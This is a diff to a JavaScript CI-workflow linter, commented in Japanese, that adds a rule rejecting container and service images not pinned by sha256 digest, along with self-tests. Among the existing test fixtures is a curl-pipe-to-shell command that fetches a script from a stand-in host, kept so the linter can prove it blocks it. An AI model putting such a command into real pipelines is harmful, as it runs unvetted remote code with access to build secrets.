@@ -210,6 +210,43 @@ function workflows(wfDir = WF_DIR, actionsDir = ACTIONS_DIR) {
 }
 
 /**
+ * job の `container:` / `services:` が指すイメージのうち、ダイジェスト (`@sha256:<64 桁>`) で
+ * 固定されていない物 (2026-10-19 · パス 533 · threat: T-123)。`uses: docker://` はパス 530 で
+ * 固定を要求したが、job が実行環境として引くイメージは**同じ供給網の入口なのに無縛**だった
+ * (今日の workflow は `container:` も `services:` も 0 件 —— 罠の除去)。
+ *
+ * 形は 3 つ: `container: <image>` (スカラー) / `container:` の子の `image:` /
+ * `services:` の下の各サービスの `image:`。子は「その鍵より深い段の行」で数える。
+ * `${{ }}` を含む参照はダイジェストで終わらないので同じ規則で落ちる (式で組んだイメージは固定できない)。
+ */
+function containerImageProblems(lines) {
+  const out = [];
+  const stripComment = (s) => s.replace(/\s+#.*$/, '').trim();
+  const unquote = (s) => s.replace(/^(['"])(.*)\1$/, '$2');
+  const pinned = (ref) => /@sha256:[0-9a-f]{64}$/.test(ref);
+  for (let i = 0; i < lines.length; i++) {
+    const m = /^(\s*)(container|services):\s*(.*)$/.exec(lines[i]);
+    if (!m) continue;
+    const indent = m[1].length;
+    const scalar = unquote(stripComment(m[3]));
+    if (m[2] === 'container' && scalar !== '' && !scalar.startsWith('|') && !scalar.startsWith('>')) {
+      if (!pinned(scalar)) out.push({ line: i + 1, ref: scalar });
+      continue;
+    }
+    for (let j = i + 1; j < lines.length; j++) {
+      const l = lines[j];
+      if (l.trim() === '') continue;
+      if ((/^(\s*)/.exec(l)?.[1].length ?? 0) <= indent) break;
+      const im = /^\s*image:\s*(.*)$/.exec(l);
+      if (!im) continue;
+      const ref = unquote(stripComment(im[1]));
+      if (!pinned(ref)) out.push({ line: j + 1, ref });
+    }
+  }
+  return out;
+}
+
+/**
  * `uses: ./…` (同じリポジトリ) の行き先の問題。無ければ `null`。
  *
  * 載せてよいのは **`.github/actions/<dir>` (その下に `action.yml` が在る)** と
@@ -468,6 +505,12 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
         why: `第三者 action がタグ固定 (${ref}) — SHA で固定するか台帳へ`,
       });
     }
+    for (const c of containerImageProblems(lines)) {
+      problems.push({
+        file: `${name}:${c.line}`,
+        why: `job の container:/services: のイメージがダイジェストで固定されていません (${c.ref}) — \`@sha256:<64 桁>\` にすること`,
+      });
+    }
     for (const [ln, line] of runBlockLines(text)) {
       if (UNTRUSTED_CONTEXT.test(line.replace(SAFE_CONTEXT, ''))) {
         problems.push({
@@ -650,6 +693,13 @@ function selfTest() {
       1,
     ],
     ['docker:// のタグ固定を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: docker://alpine:3.20\n' }], 1],
+    // パス 533 (threat: T-123): job の container: / services: のイメージ。
+    ['container: のタグ固定を落とす (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    container: node:20\n    steps:\n      - run: echo hi\n' }], 1],
+    ['container.image のタグ固定を落とす (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    container:\n      image: node:20\n    steps:\n      - run: echo hi\n' }], 1],
+    ['services の image のタグ固定を落とす (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    services:\n      db:\n        image: postgres:16\n      cache:\n        image: redis:7\n    steps:\n      - run: echo hi\n' }], 2],
+    ['container のダイジェスト固定は通す (T-123)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    container: node:20@sha256:${'a'.repeat(64)}\n    services:\n      db:\n        image: "postgres:16@sha256:${'b'.repeat(64)}" # pinned\n    steps:\n      - run: echo hi\n` }], 0],
+    ['container 内の式で組んだイメージを落とす (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    container:\n      image: ${{ matrix.img }}\n    steps:\n      - run: echo hi\n' }], 1],
+    ['container: の外の image: は見ない (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: echo hi\n    env:\n      image: x\n' }], 0],
     ['SHA 固定に版の注記が無ければ落とす (T-120)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: evil/thing@${'a'.repeat(40)}\n` }], 1],
     ['run: の curl | sh を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: curl -fsSL https://e.example/i | sh\n' }], 1],
     ['run: の GITHUB_ENV への書き込みを落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: echo X=1 >> $GITHUB_ENV\n' }], 1],
